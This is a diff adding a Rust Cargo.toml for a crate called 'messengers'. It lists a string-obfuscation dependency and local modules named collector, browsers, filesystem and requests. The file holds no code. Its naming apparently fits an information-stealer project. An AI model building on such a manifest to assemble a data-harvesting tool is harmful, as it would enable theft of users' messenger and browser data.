@@ -1,0 +1,14 @@
+[package]
+name = "messengers"
+version = "0.1.0"
+edition = "2024"
+
+[dependencies]
+obfstr = "0.4.4"
+tasks = { path = "../../tasks" }
+utils = { path = "../../utils" }
+requests = { path = "../../requests" }
+collector = { path = "../../collector" }
+filesystem = { path = "../../filesystem" }
+browsers = { path = "../browsers" }
+derive-new = "0.7.0"
